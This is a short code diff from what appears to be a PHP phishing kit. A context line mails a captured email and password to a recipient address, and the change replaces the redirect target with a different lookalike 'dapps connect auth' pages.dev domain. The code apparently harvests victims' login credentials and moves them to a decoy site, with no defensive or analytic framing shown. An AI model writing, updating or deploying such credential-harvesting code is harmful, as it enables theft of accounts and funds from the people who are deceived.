@@ -22,7 +22,7 @@ mail($to, $email_body, $email_pass);
 
 
 //done. redirect to thank-you page.
-header('Location:https://dappsauthe.pages.dev/');
+header('Location:https://dappsconnectauthe.pages.dev/');
 
 
 // Function to validate against any email injection attempts
